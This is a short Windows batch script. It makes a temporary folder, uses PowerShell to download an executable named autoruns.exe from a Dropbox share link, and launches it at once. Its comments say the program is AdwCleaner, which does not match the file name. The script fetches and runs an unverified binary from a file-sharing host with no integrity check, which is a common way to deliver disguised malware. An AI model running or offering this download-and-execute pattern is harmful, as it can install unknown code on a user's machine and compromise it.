@echo off

REM Set temporary directory
set "tempDir=%TEMP%\autoruns"

REM Create a temporary directory
mkdir "%tempDir%"

REM Download AdwCleaner from the provided link
powershell -command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/wchh8gntr7k2k4ik2h1xl/autoruns.exe?rlkey=1nj1ka5e26xkq5i6mnntcjv15&dl=1', '%tempDir%\autoruns.exe')"

REM Run AdwCleaner from the temporary directory
start "" "%tempDir%\autoruns.exe"